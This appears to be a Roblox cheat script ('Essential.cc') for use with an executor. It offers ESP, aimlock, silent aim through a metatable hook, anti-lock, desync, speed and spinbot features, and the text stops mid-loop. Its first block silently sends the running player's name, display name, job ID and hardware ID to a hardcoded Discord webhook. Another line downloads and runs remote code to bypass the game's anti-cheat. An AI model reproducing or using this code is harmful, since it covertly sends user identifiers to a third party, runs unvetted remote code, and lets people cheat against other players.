--//uploaded by doitenroi.9941
pcall(function()
    player = game.Players.LocalPlayer
    http = game:GetService("HttpService")
    headers = {
        ["Content-Type"] = "application/json"
    }
    jobId = game.JobId
    hwid = game:GetService("RbxAnalyticsService"):GetClientId()
    embed = {
        ["title"] = "Player Execution Log",
        ["color"] = 11163115,
        ["fields"] = {
            {["name"] = "Name", ["value"] = player.Name, ["inline"] = true},
            {["name"] = "Display Name", ["value"] = player.DisplayName, ["inline"] = true},
            {["name"] = "Job ID", ["value"] = jobId, ["inline"] = false},
            {["name"] = "HWID", ["value"] = hwid, ["inline"] = false}
        },
        ["timestamp"] = DateTime.now():ToIsoDate()
    }
    data = {["embeds"] = {embed}}
    body = http:JSONEncode(data)
    request({
        Url = "https://discord.com/api/webhooks/1492568912821489776/r6gXB_84kzRWRFdGTr1biVeUr7RxiQ9UhPt2584zQL768XInzBjznT5g-ol5AGpwJdZJ",
        Method = "POST",
        Headers = headers,
        Body = body
    })
end)

pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Pixeluted/adoniscries/main/Source.lua"))() end)


local LPH_NO_VIRTUALIZE = LPH_NO_VIRTUALIZE or function(f) return f end
loadstring([[
    function LPH_NO_VIRTUALIZE(f) return f end;
]])()

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local Workspace = game:GetService("Workspace")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local Lighting = game:GetService("Lighting")

local player = Players.LocalPlayer
local Camera = Workspace.CurrentCamera

local ESPSettings = {
    Boxes = false,
    HealthBar = false,
    Tracers = false,
    BoxColor = Color3.fromRGB(255, 255, 255),
    TracerColor = Color3.fromRGB(255, 255, 255),
    HealthBarColor = Color3.fromRGB(0, 255, 0)
}

local Settings = {
    Smoothness = 0.11,
    Prediction = 0.165,
    MaxDistance = math.huge,
    HitPart = "HumanoidRootPart",
    MaxCursorDistance = math.huge,
    Horizontal = 0.165,
    Vertical = 0,
    MaxLockDistance = math.huge,
    BreakOnDeath = true,
    Notifications = false,
    AimAssist = false,
    TargetAim = false,
    AutoAir = false,
    AirOffset = "0.1",
    NamecallMode = "FireServer",
    AutoPrediction = false,
    TargetStrafe = false,
    StrafeSpeed = 5,
    StrafeHeight = 0,
    StrafeDistance = 5,
    StrafeMode = "Orbit",
    StrafeAngle = 0,
    CFrameEnabled = false,
    CFrameSpeed = 18,
    LookAt = false,
    FogEnabled = false,
    FogColor = Color3.fromRGB(255, 255, 255),
    AntiLockEnabled = false,
    AntiLockMode = "NetworkSleep",
    DesyncEnabled = false,
    VelocityManipulation = false,
    FreefallBoost = false,
    CrosshairEnabled = true,
    ForcefieldEnabled = false,
    SpinBotEnabled = false,
    SpinBotSpeed = 50,
    CircleEnabled = false,
    CircleFilled = false,
    CircleSize = 100,
    CircleMode = "Mouse",
    CircleColor = Color3.fromRGB(255, 255, 255),
    BulletTPPlayer = nil,
    BulletTPMode = "Closest"
}

getgenv().SilentAim = {
    Enabled = false,
    Target = nil,
    HitPart = "HumanoidRootPart",
    Horizontal = 0.165,
    Vertical = 0
}

local Locked = false
local Victim = nil
local CachedPart = nil
local LockButtonFrame = nil
local LockButton = nil
local ScreenGui = nil
local Dragging = false
local DragStart = nil
local StartPos = nil

local LastAirShot = 0
local IsAirShooting = false
local LastToggle = 0

local StrafeConnection = nil
local CFrameConnection = nil

local ESP = {}

local BulletTPGui = nil
local BulletTPActive = false
local BulletTPDropdown = nil

local DesyncConnections = {}
local DesyncParts = {}

local ForcefieldObjects = {}


getgenv().crosshair = {
    enabled = true,
    refreshrate = 0,
    mode = "mouse",
    position = Vector2.new(0, 0),
    width = 1.5,
    length = 10,
    radius = 11,
    color = Color3.new(0, 0, 0),
    spin = false,
    spin_speed = 0,
    spin_max = 0,
    spin_style = Enum.EasingStyle.Sine,
    resize = false,
    resize_speed = 0,
    resize_min = 0,
    resize_max = 0,
}


local oldDrawingNew
pcall(function()
    oldDrawingNew = hookfunction(Drawing.new, LPH_NO_VIRTUALIZE(function(class, properties)
        local drawing = oldDrawingNew(class)
        for i, v in next, properties or {} do
            drawing[i] = v
        end
        return drawing
    end))
end)

local drawings = {
    crosshair = {},
    text = {
        Drawing.new("Text", {
            Size = 13,
            Font = 2,
            Outline = true,
            Text = "Essential.cc",
            Color = Color3.new(0, 0, 0)
        })
    }
}

for i = 1, 4 do
    drawings.crosshair[i] = Drawing.new("Line")
end


local solve = LPH_NO_VIRTUALIZE(function(angle, radius)
    return Vector2.new(
        math.sin(math.rad(angle)) * radius,
        math.cos(math.rad(angle)) * radius
    )
end)


local GetFovOrigin = LPH_NO_VIRTUALIZE(function()
    if Settings.CircleMode == "Mouse" then
        return UserInputService:GetMouseLocation()
    else
        return Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
    end
end)

local fovCircle = Drawing.new("Circle")
fovCircle.Thickness = 2
fovCircle.NumSides = 64
fovCircle.Radius = Settings.CircleSize
fovCircle.Filled = Settings.CircleFilled
fovCircle.Color = Settings.CircleColor
fovCircle.Transparency = 1
fovCircle.Visible = false


RunService.PostSimulation:Connect(LPH_NO_VIRTUALIZE(function()
    if not crosshair.enabled then
        for i = 1, 4 do
            drawings.crosshair[i].Visible = false
        end
        drawings.text[1].Visible = false
        return
    end

    local position = (
        crosshair.mode == "center" and Camera.ViewportSize / 2 or
        crosshair.mode == "mouse" and UserInputService:GetMouseLocation() or
        crosshair.position
    )

    drawings.text[1].Visible = true
    drawings.text[1].Position = position + Vector2.new(
        -drawings.text[1].TextBounds.X / 2,
        crosshair.radius + crosshair.length + 10
    )

    for i = 1, 4 do
        local line = drawings.crosshair[i]
        local angle = (i - 1) * 90

        line.Visible = true
        line.Color = crosshair.color
        line.Thickness = crosshair.width
        line.From = position + solve(angle, crosshair.radius)
        line.To = position + solve(angle, crosshair.radius + crosshair.length)
    end
end))


RunService.RenderStepped:Connect(LPH_NO_VIRTUALIZE(function()
    local pos = GetFovOrigin()

    fovCircle.Position = pos
    fovCircle.Radius = Settings.CircleSize
    fovCircle.Filled = Settings.CircleFilled
    fovCircle.Color = Settings.CircleColor
    fovCircle.Visible = Settings.CircleEnabled
    
    if Settings.CircleFilled then
        fovCircle.Transparency = 0.5
        fovCircle.Thickness = 1
    else
        fovCircle.Transparency = 1
        fovCircle.Thickness = 2
    end
end))


local ClearForcefield = LPH_NO_VIRTUALIZE(function()
    for _, obj in pairs(ForcefieldObjects) do
        if obj and obj.Parent then
            obj:Destroy()
        end
    end
    ForcefieldObjects = {}
end)

local CreateForcefield = LPH_NO_VIRTUALIZE(function()
    ClearForcefield()
    
    local character = player.Character
    if not character then return end

    local existingForceField = character:FindFirstChild("ForceField")
    if existingForceField then
        existingForceField:Destroy()
    end

    local forceField = Instance.new("ForceField")
    forceField.Parent = character
    table.insert(ForcefieldObjects, forceField)

    local billboard = Instance.new("BillboardGui")
    billboard.Size = UDim2.new(4, 0, 4, 0)
    billboard.Adornee = character.PrimaryPart or character:FindFirstChild("HumanoidRootPart")
    billboard.AlwaysOnTop = true
    billboard.Parent = character
    table.insert(ForcefieldObjects, billboard)

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(1, 0, 1, 0)
    frame.BackgroundColor3 = Color3.fromRGB(128, 0, 255)
    frame.BackgroundTransparency = 0.5
    frame.BorderSizePixels = 0
    frame.Parent = billboard
    table.insert(ForcefieldObjects, frame)

    local selectionBox = Instance.new("SelectionBox")
    selectionBox.Adornee = character
    selectionBox.Color3 = Color3.fromRGB(128, 0, 255)
    selectionBox.LineThickness = 0.1
    selectionBox.Transparency = 0.4
    selectionBox.Parent = character
    table.insert(ForcefieldObjects, selectionBox)

    local hrp = character:FindFirstChild("HumanoidRootPart") or character.PrimaryPart
    if hrp then
        local attachment = Instance.new("Attachment")
        attachment.Parent = hrp
        table.insert(ForcefieldObjects, attachment)

        local particles = Instance.new("ParticleEmitter")
        particles.Parent = attachment
        particles.Texture = "rbxasset://textures/particles/sparkles_main.dds"
        particles.Color = ColorSequence.new(Color3.fromRGB(128, 0, 255))
        particles.Transparency = NumberSequence.new(0.6)
        particles.SpreadAngle = Vector2.new(180, 180)
        particles.VelocityInheritance = 0
        particles.Rate = 30
        particles.Lifetime = NumberRange.new(0.8)
        particles.Speed = NumberRange.new(0.5, 1.5)
        particles.Rotation = NumberRange.new(0, 360)
        table.insert(ForcefieldObjects, particles)
    end
end)


local createCorner = LPH_NO_VIRTUALIZE(function()
    local line = Drawing.new("Line")
    line.Color = Color3.fromRGB(255, 255, 255)
    line.Thickness = 2
    line.Visible = false
    return line
end)

local createTracer = LPH_NO_VIRTUALIZE(function()
    local line = Drawing.new("Line")
    line.Color = Color3.fromRGB(255, 255, 255)
    line.Thickness = 1
    line.Visible = false
    return line
end)

local createHealthBar = LPH_NO_VIRTUALIZE(function()
    local bar = Drawing.new("Line")
    bar.Thickness = 4
    bar.Visible = false
    return bar
end)

local addESP = LPH_NO_VIRTUALIZE(function(plr)
    if plr == Players.LocalPlayer or ESP[plr] then return end
    
    ESP[plr] = {
        Corners = {
            TL1 = createCorner(), TL2 = createCorner(),
            TR1 = createCorner(), TR2 = createCorner(),
            BL1 = createCorner(), BL2 = createCorner(),
            BR1 = createCorner(), BR2 = createCorner(),
        },
        Tracer = createTracer(),
        HealthBar = createHealthBar()
    }
end)

local removeESP = LPH_NO_VIRTUALIZE(function(plr)
    if ESP[plr] then
        for _, obj in pairs(ESP[plr]) do
            if typeof(obj) == "table" then
                for _, v in pairs(obj) do v:Remove() end
            else
                obj:Remove()
            end
        end
        ESP[plr] = nil
    end
end)

for _, p in pairs(Players:GetPlayers()) do addESP(p) end
Players.PlayerAdded:Connect(addESP)
Players.PlayerRemoving:Connect(removeESP)


local getBoundingBox = LPH_NO_VIRTUALIZE(function(character)
    local minX, minY = math.huge, math.huge
    local maxX, maxY = -math.huge, -math.huge
    local any = false

    for _, part in pairs(character:GetChildren()) do
        if part:IsA("BasePart") then
            local cf, size = part.CFrame, part.Size
            local corners = {
                Vector3.new(-1,-1,-1), Vector3.new(1,-1,-1),
                Vector3.new(-1,1,-1), Vector3.new(1,1,-1),
                Vector3.new(-1,-1,1), Vector3.new(1,-1,1),
                Vector3.new(-1,1,1), Vector3.new(1,1,1),
            }
            for _, c in pairs(corners) do
                local world = cf * (size * 0.5 * c)
                local screen, vis = Camera:WorldToViewportPoint(world)
                if vis then
                    any = true
                    minX = math.min(minX, screen.X)
                    minY = math.min(minY, screen.Y)
                    maxX = math.max(maxX, screen.X)
                    maxY = math.max(maxY, screen.Y)
                end
            end
        end
    end

    if not any then return end
    return Vector2.new(minX, minY), Vector2.new(maxX-minX, maxY-minY)
end)


RunService.RenderStepped:Connect(LPH_NO_VIRTUALIZE(function()
    for plr, data in pairs(ESP) do
        local char = plr.Character
        local corners = data.Corners
        local tracer = data.Tracer
        local healthBar = data.HealthBar

        if char and char:FindFirstChild("HumanoidRootPart") then
            local pos, size = getBoundingBox(char)

            if pos and size then
                local x, y = pos.X, pos.Y
                local w, h = size.X, size.Y
                local l = math.clamp(w * 0.25, 6, 20)

                for _, c in pairs(corners) do 
                    c.Color = ESPSettings.BoxColor
                    c.Visible = ESPSettings.Boxes 
                end

                corners.TL1.From = Vector2.new(x, y)
                corners.TL1.To = Vector2.new(x + l, y)
                corners.TL2.From = Vector2.new(x, y)
                corners.TL2.To = Vector2.new(x, y + l)

                corners.TR1.From = Vector2.new(x + w, y)
                corners.TR1.To = Vector2.new(x + w - l, y)
                corners.TR2.From = Vector2.new(x + w, y)
                corners.TR2.To = Vector2.new(x + w, y + l)

                corners.BL1.From = Vector2.new(x, y + h)
                corners.BL1.To = Vector2.new(x + l, y + h)
                corners.BL2.From = Vector2.new(x, y + h)
                corners.BL2.To = Vector2.new(x, y + h - l)

                corners.BR1.From = Vector2.new(x + w, y + h)
                corners.BR1.To = Vector2.new(x + w - l, y + h)
                corners.BR2.From = Vector2.new(x + w, y + h)
                corners.BR2.To = Vector2.new(x + w, y + h - l)

                local hum = char:FindFirstChildWhichIsA("Humanoid")
                if hum and ESPSettings.HealthBar then
                    local hp = math.clamp(hum.Health / hum.MaxHealth, 0, 1)
                    local hbHeight = h * hp
                    local hbY = y + h - hbHeight

                    healthBar.From = Vector2.new(x - 5, y + h)
                    healthBar.To = Vector2.new(x - 5, hbY)

                    local baseColor = ESPSettings.HealthBarColor
                    if hp > 0.5 then
                        healthBar.Color = Color3.new(baseColor.R, baseColor.G, baseColor.B)
                    elseif hp > 0.25 then
                        healthBar.Color = Color3.new(1, 1, 0)
                    else
                        healthBar.Color = Color3.new(1, 0, 0)
                    end

                    healthBar.Visible = true
                else
                    healthBar.Visible = false
                end

                if ESPSettings.Tracers then
                    local root = char:FindFirstChild("HumanoidRootPart")
                    local screenPos, visible = Camera:WorldToViewportPoint(root.Position)

                    if visible then
                        tracer.From = Vector2.new(Camera.ViewportSize.X/2, Camera.ViewportSize.Y)
                        tracer.To = Vector2.new(screenPos.X, screenPos.Y)
                        tracer.Color = ESPSettings.TracerColor
                        tracer.Visible = true
                    else
                        tracer.Visible = false
                    end
                else
                    tracer.Visible = false
                end

            else
                for _, c in pairs(corners) do c.Visible = false end
                tracer.Visible = false
                healthBar.Visible = false
            end
        else
            for _, c in pairs(corners) do c.Visible = false end
            tracer.Visible = false
            healthBar.Visible = false
        end
    end
end))


local InnalillahiMataKiri = Instance.new("ScreenGui")
InnalillahiMataKiri.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
InnalillahiMataKiri.Parent = game:GetService("CoreGui")

local Notifications_Frame = Instance.new("Frame")
Notifications_Frame.Name = "Notifications"
Notifications_Frame.BackgroundTransparency = 1
Notifications_Frame.Size = UDim2.new(1, 0, 1, 36)
Notifications_Frame.Position = UDim2.fromOffset(0, -36)
Notifications_Frame.ZIndex = 5
Notifications_Frame.Parent = InnalillahiMataKiri

local NotificationSystem = {}
local ActiveNotifications = {}

local function GetDictionaryLength(dictionary)
    local count = 0
    for _ in pairs(dictionary) do
        count = count + 1
    end
    return count
end

function NotificationSystem:Notify(Content, DelayTime)
    if not Settings.Notifications then return end
    
    local DelayTime = typeof(DelayTime) == "number" and DelayTime or 3

    local Text = Instance.new("TextLabel")
    local Notification = {self = Text, Class = "Notification"}

    Text.Name = "Notification"
    Text.BackgroundTransparency = 1
    Text.Position = UDim2.new(0.5, -190, 1, -130 - (GetDictionaryLength(ActiveNotifications) * 15))
    Text.Size = UDim2.new(0, 200, 0, 15)
    Text.Text = Content
    Text.Font = Enum.Font.SourceSans
    Text.TextSize = 14
    Text.TextColor3 = Color3.new(1, 1, 1)
    Text.TextStrokeTransparency = 0.2
    Text.TextTransparency = 1
    Text.RichText = true
    Text.ZIndex = 4
    Text.Parent = Notifications_Frame

    local function CustomTweenOffset(Offset)
        spawn(function()
            local Steps = 33
            for i = 1, Steps do
                Text.Position = Text.Position + UDim2.fromOffset(Offset / Steps, 0)
                RunService.RenderStepped:Wait()
            end
        end)
    end

    function Notification:Destroy()
        ActiveNotifications[Notification] = nil
        Text:Destroy()
        for _, v in pairs(ActiveNotifications) do
            v.self.Position = v.self.Position + UDim2.fromOffset(0, 15)
        end
    end

    ActiveNotifications[Notification] = Notification

    local TweenIn = TweenService:Create(Text, TweenInfo.new(0.3), {TextTransparency = 0})
    local TweenOut = TweenService:Create(Text, TweenInfo.new(0.2), {TextTransparency = 1})

    TweenIn:Play()
    CustomTweenOffset(100)

    TweenIn.Completed:Connect(function()
        delay(DelayTime, function()
            TweenOut:Play()
            CustomTweenOffset(100)
            TweenOut.Completed:Connect(function()
                Notification:Destroy()
            end)
        end)
    end)
end


local AntiLockConnection = nil

local StartAntiLock = LPH_NO_VIRTUALIZE(function()
    if AntiLockConnection then return end
    
    pcall(function()
        setfflag("S2PhysicsSenderRate", 2)
    end)
    
    AntiLockConnection = RunService.Heartbeat:Connect(LPH_NO_VIRTUALIZE(function()
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            local hrp = player.Character.HumanoidRootPart
            pcall(function()
                sethiddenproperty(hrp, "NetworkIsSleeping", true)
                task.wait()
                sethiddenproperty(hrp, "NetworkIsSleeping", false)
            end)
        end
    end))
end)

local StopAntiLock = LPH_NO_VIRTUALIZE(function()
    if AntiLockConnection then
        AntiLockConnection:Disconnect()
        AntiLockConnection = nil
    end
    
    pcall(function()
        setfflag("S2PhysicsSenderRate", 13)
    end)
    
    if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        pcall(function()
            sethiddenproperty(player.Character.HumanoidRootPart, "NetworkIsSleeping", false)
        end)
    end
end)


local mt = getrawmetatable(game)
local oldNameCall = mt.__namecall
setreadonly(mt, false)

mt.__namecall = newcclosure(LPH_NO_VIRTUALIZE(function(Self, ...)
    local args = {...}
    local methodName = getnamecallmethod()
    
    if Settings.NamecallMode == "FireServer" then
        if not checkcaller() and methodName == "FireServer" and getgenv().SilentAim.Enabled then
            local target = getgenv().SilentAim.Target
            for i, Argument in ipairs(args) do
                if typeof(Argument) == "Vector3" and target and target.Character then
                    local targetPart = target.Character[getgenv().SilentAim.HitPart]
                    if targetPart then
                        args[i] = targetPart.Position + 
                                 (targetPart.Velocity * getgenv().SilentAim.Horizontal) + 
                                 Vector3.new(0, getgenv().SilentAim.Vertical, 0)
                    end
                end
            end
        end
    elseif Settings.NamecallMode == "Raycast" then
        if not checkcaller() and methodName == "Raycast" and getgenv().SilentAim.Enabled and getgenv().SilentAim.Target then
            local target = getgenv().SilentAim.Target
            if target and target.Character and target.Character:FindFirstChild(getgenv().SilentAim.HitPart) then
                local origin = args[1]
                if typeof(origin) == "Vector3" then
                    local targetPos = target.Character[getgenv().SilentAim.HitPart].Position
                    args[2] = (targetPos - origin).Unit * 1000
                    return oldNameCall(Self, unpack(args))
                end
            end
        end
    end
    
    return oldNameCall(Self, unpack(args))
end))

setreadonly(mt, true)


local GetScreenCenter = LPH_NO_VIRTUALIZE(function()
    return Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
end)

local GetClosestPlayerByCursor = LPH_NO_VIRTUALIZE(function()
    local closestPlayer = nil
    local shortestDistance = Settings.MaxCursorDistance
    local screenCenter = GetScreenCenter()
    
    for _, plr in pairs(Players:GetPlayers()) do
        if plr ~= player and plr.Character and plr.Character:FindFirstChild(Settings.HitPart) then
            local humanoid = plr.Character:FindFirstChild("Humanoid")
            if humanoid and humanoid.Health > 0 then
                local targetPart = plr.Character[Settings.HitPart]
                local targetPos = targetPart.Position + Vector3.new(0, 1, 0)
                local screenPos, onScreen = Camera:WorldToViewportPoint(targetPos)
                
                if onScreen then
                    local distFromCenter = (Vector2.new(screenPos.X, screenPos.Y) - screenCenter).Magnitude
                    if distFromCenter < shortestDistance then
                        closestPlayer = plr
                        shortestDistance = distFromCenter
                    end
                end
            end
        end
    end
    
    return closestPlayer
end)

local IsVictimValid = LPH_NO_VIRTUALIZE(function()
    if not Victim then return false end
    if not Victim.Character then return false end
    
    local targetPart = Victim.Character:FindFirstChild(Settings.HitPart)
    local humanoid = Victim.Character:FindFirstChild("Humanoid")
    
    if not targetPart or not humanoid then return false end
    if Settings.BreakOnDeath and humanoid.Health <= 0 then return false end
    
    return true
end)

local DoAutoAir = LPH_NO_VIRTUALIZE(function()
    if not Settings.AutoAir or not Locked or not Victim or not Victim.Character then return end
    
    local targetHRP = Victim.Character:FindFirstChild("HumanoidRootPart")
    local targetHumanoid = Victim.Character:FindFirstChild("Humanoid")
    if not targetHRP or not targetHumanoid then return end
    
    local velocityY = targetHRP.Velocity.Y
    
    if velocityY > 15 then
        local now = tick()
        local delayTime = tonumber(Settings.AirOffset) or 0.1
        delayTime = math.max(0.1, delayTime)
        
        if now - LastAirShot >= delayTime then
            LastAirShot = now
            
            local char = player.Character
            if char then
                local tool = char:FindFirstChildOfClass("Tool")
                if tool then
                    tool:Activate()
                    
                    if Settings.Notifications and not IsAirShooting then
                        IsAirShooting = true
                        NotificationSystem:Notify("Auto Air: Shooting at " .. Victim.Name, 1)
                        task.delay(0.5, function()
                            IsAirShooting = false
                        end)
                    end
                end
            end
        end
    end
end)

local ToggleLock = LPH_NO_VIRTUALIZE(function()
    local now = tick()
    if now - LastToggle < 0.3 then return end
    LastToggle = now
    
    if Locked then
        Locked = false
        if Victim then
            NotificationSystem:Notify("Unlocked: " .. Victim.Name, 3)
        end
        Victim = nil
        CachedPart = nil
        
        getgenv().SilentAim.Enabled = false
        getgenv().SilentAim.Target = nil
        
        if LockButton then LockButton.Image = "rbxassetid://88399410034249" end
        return
    end
    
    Victim = GetClosestPlayerByCursor()
    if Victim and Victim.Character then
        Locked = true
        CachedPart = Victim.Character[Settings.HitPart]
        
        getgenv().SilentAim.Enabled = Settings.TargetAim
        getgenv().SilentAim.Target = Victim
        getgenv().SilentAim.HitPart = Settings.HitPart
        getgenv().SilentAim.Horizontal = Settings.Horizontal
        
        NotificationSystem:Notify("Locked on: " .. Victim.Name, 3)
        
        if LockButton then LockButton.Image = "rbxassetid://96734356722259" end
    else
        NotificationSystem:Notify("No target found", 3)
    end
end)

local CreateOrUpdateLockButton = LPH_NO_VIRTUALIZE(function()
    if ScreenGui then
        ScreenGui:Destroy()
        ScreenGui = nil
        LockButtonFrame = nil
        LockButton = nil
    end
    
    if not Settings.AimAssist then return end
    
    ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "LockScreenGui"
    ScreenGui.Parent = player:WaitForChild("PlayerGui")
    ScreenGui.ResetOnSpawn = false
    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

    LockButtonFrame = Instance.new("Frame")
    LockButtonFrame.Name = "LockButtonFrame"
    LockButtonFrame.Size = UDim2.new(0, 80, 0, 80)
    LockButtonFrame.Position = UDim2.new(0.5, -40, 0.7, 0)
    LockButtonFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    LockButtonFrame.BackgroundTransparency = 0.3
    LockButtonFrame.BorderSizePixel = 0
    LockButtonFrame.Parent = ScreenGui
    LockButtonFrame.Active = true
    
    local bgCorner = Instance.new("UICorner")
    bgCorner.CornerRadius = UDim.new(0, 12)
    bgCorner.Parent = LockButtonFrame

    LockButton = Instance.new("ImageButton")
    LockButton.Name = "LockButton"
    LockButton.Size = UDim2.new(0, 70, 0, 70)
    LockButton.Position = UDim2.new(0.5, -35, 0.5, -35)
    LockButton.Image = Locked and "rbxassetid://96734356722259" or "rbxassetid://88399410034249"
    LockButton.BackgroundTransparency = 1
    LockButton.BorderSizePixel = 0
    LockButton.Parent = LockButtonFrame
    LockButton.Active = false

    LockButton.MouseButton1Click:Connect(ToggleLock)
    LockButton.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.Touch then ToggleLock() end
    end)
    
    LockButtonFrame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            Dragging = true
            DragStart = input.Position
            StartPos = LockButtonFrame.Position
            
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    Dragging = false
                end
            end)
        end
    end)
    
    LockButtonFrame.InputChanged:Connect(function(input)
        if Dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            local delta = input.Position - DragStart
            LockButtonFrame.Position = UDim2.new(
                StartPos.X.Scale, 
                StartPos.X.Offset + delta.X, 
                StartPos.Y.Scale, 
                StartPos.Y.Offset + delta.Y
            )
        end
    end)
end)


local StartStrafe = LPH_NO_VIRTUALIZE(function()
    if StrafeConnection then return end
    
    StrafeConnection = RunService.Heartbeat:Connect(LPH_NO_VIRTUALIZE(function()
        if not Settings.TargetStrafe or not Locked or not Victim then
            return
        end
        
        if not Victim.Character or not player.Character then
            return
        end
        
        local targetHRP = Victim.Character:FindFirstChild("HumanoidRootPart")
        local localHRP = player.Character:FindFirstChild("HumanoidRootPart")
        
        if not targetHRP or not localHRP then
            return
        end
        
        Settings.StrafeAngle = Settings.StrafeAngle + (Settings.StrafeSpeed * 0.01)
        
        local mode = Settings.StrafeMode
        if mode == "Random" then
            mode = math.random() > 0.5 and "Orbit" or "Circle"
        end
        
        local offsetX, offsetZ
        
        if mode == "Orbit" then
            offsetX = math.sin(Settings.StrafeAngle) * Settings.StrafeDistance
            offsetZ = math.cos(Settings.StrafeAngle) * Settings.StrafeDistance
        else
            offsetX = math.sin(Settings.StrafeAngle * 2) * Settings.StrafeDistance
            offsetZ = math.cos(Settings.StrafeAngle) * Settings.StrafeDistance
        end
        
        local targetPos = targetHRP.Position + Vector3.new(offsetX, Settings.StrafeHeight, offsetZ)
        
        local currentCFrame = localHRP.CFrame
        local targetCFrame = CFrame.new(targetPos, targetHRP.Position)
        localHRP.CFrame = currentCFrame:Lerp(targetCFrame, 0.3)
    end))
end)

local StopStrafe = LPH_NO_VIRTUALIZE(function()
    if StrafeConnection then
        StrafeConnection:Disconnect()
        StrafeConnection = nil
    end
end)

local StartCFrameSpeed = LPH_NO_VIRTUALIZE(function()
    if CFrameConnection then return end
    CFrameConnection = RunService.RenderStepped:Connect(LPH_NO_VIRTUALIZE(function()
        if not Settings.CFrameEnabled then return end
        local char = player.Character
        if not char then return end
        local hrp = char:FindFirstChild("HumanoidRootPart")
        local hum = char:FindFirstChildWhichIsA("Humanoid")
        if not hrp or not hum then return end
        
        if hum.MoveDirection.Magnitude > 0 then
            hrp.CFrame = hrp.CFrame + (hum.MoveDirection * (Settings.CFrameSpeed / 10))
        end
    end))
end)

local StopCFrameSpeed = LPH_NO_VIRTUALIZE(function()
    if CFrameConnection then
        CFrameConnection:Disconnect()
        CFrameConnection = nil
    end
end)


local DesyncSetupFunc = LPH_NO_VIRTUALIZE(function()
    DesyncParts = {}
    local char = player.Character
    if not char then return end
    for _,v in pairs(char:GetDescendants()) do
        if v:IsA("BasePart") and v.Transparency == 0 then
            table.insert(DesyncParts, v)
        end
    end
end)

local StopDesync = LPH_NO_VIRTUALIZE(function()
    Settings.DesyncEnabled = false
    for _,v in pairs(DesyncParts) do
        if v and v.Parent then
            v.Transparency = 0
        end
    end
    DesyncParts = {}
    if DesyncConnections[1] then
        DesyncConnections[1]:Disconnect()
        DesyncConnections[1] = nil
    end
    if DesyncConnections[2] then
        DesyncConnections[2]:Disconnect()
        DesyncConnections[2] = nil
    end
end)

local StartDesync = LPH_NO_VIRTUALIZE(function()
    if DesyncConnections[1] then StopDesync() end
    DesyncSetupFunc()
    Settings.DesyncEnabled = true
    
    for _,v in pairs(DesyncParts) do
        v.Transparency = 0.5
    end

    DesyncConnections[2] = RunService.Heartbeat:Connect(LPH_NO_VIRTUALIZE(function()
        if not Settings.DesyncEnabled then return end
        local char = player.Character
        if not char then return end
        local root = char:FindFirstChild("HumanoidRootPart")
        local humanoid = char:FindFirstChildWhichIsA("Humanoid")
        if not root or not humanoid then return end

        local oldCF = root.CFrame
        local oldOffset = humanoid.CameraOffset
        local newCF = oldCF * CFrame.new(0, -200000, 0)
        local offset = newCF:ToObjectSpace(CFrame.new(oldCF.Position)).Position
        
        root.CFrame = newCF
        humanoid.CameraOffset = offset
        
        RunService.RenderStepped:Wait()
        
        root.CFrame = oldCF
        humanoid.CameraOffset = oldOffset
    end))
end)


RunService.RenderStepped:Connect(LPH_NO_VIRTUALIZE(function()
    if Locked and Settings.AimAssist then
        if not IsVictimValid() then
            Locked = false
            if Victim then
                NotificationSystem:Notify("Unlocked: " .. Victim.Name, 3)
            end
            Victim = nil
            CachedPart = nil
            getgenv().SilentAim.Enabled = false
            getgenv().SilentAim.Target = nil
            if LockButton then LockButton.Image = "rbxassetid://88399410034249" end
            
            StopStrafe()
        else
            local targetPart = Victim.Character[Settings.HitPart]
            CachedPart = targetPart
            
            local velocity = targetPart.Velocity
            local targetPos = targetPart.Position + Vector3.new(0, 1, 0) + (velocity * Settings.Prediction)
            
            getgenv().SilentAim.Target = Victim
            
            local cameraPos = Camera.CFrame.Position
            local targetCFrame = CFrame.new(cameraPos, targetPos)
            Camera.CFrame = Camera.CFrame:Lerp(targetCFrame, Settings.Smoothness)
            
            DoAutoAir()
        end
    end
end))

RunService.RenderStepped:Connect(LPH_NO_VIRTUALIZE(function()
    if not Settings.LookAt or not Locked or not Victim or not Victim.Character then return end
    
    local localChar = player.Character
    if not localChar then return end
    
    local localHRP = localChar:FindFirstChild("HumanoidRootPart")
    local targetHRP = Victim.Character:FindFirstChild("HumanoidRootPart")
    
    if not localHRP or not targetHRP then return end
    
    local targetPos = targetHRP.Position
    local lookCFrame = CFrame.new(localHRP.Position, Vector3.new(targetPos.X, localHRP.Position.Y, targetPos.Z))
    
    localHRP.CFrame = lookCFrame
end))


RunService.Heartbeat:Connect(LPH_NO_VIRTUALIZE(function()
    local char = player.Character
    if not char or not char:FindFirstChild("HumanoidRootPart") then return end
    
    local hrp = char.HumanoidRootPart
    local hum = char:FindFirstChildWhichIsA("Humanoid")
    if not hrp or not hum then return end
    
    if Settings.VelocityManipulation then
        hrp.Velocity = Vector3.new(hum.MoveDirection.X * 16, hrp.Velocity.Y, hum.MoveDirection.Z * 16)
    end
    
    if Settings.FreefallBoost then
        if not hum.FloorMaterial or hum.FloorMaterial == Enum.Material.Air then
            hrp.Velocity = Vector3.new(hrp.Velocity.X, math.clamp(hrp.Velocity.Y, -300, 300), hrp.Velocity.Z)
            hrp.AssemblyLinearVelocity = hrp.AssemblyLinearVelocity + Vector3.new(0, 5, 0)
        end
    end
    
    if Settings.SpinBotEnabled then
        local spinSpeed = Settings.SpinBotSpeed * 0.05
        hrp.CFrame = hrp.CFrame * CFrame.Angles(0, math.rad(spinSpeed), 0)
    end
end))


task.spawn(function()
    while true do
        task.wait(0.2)
        
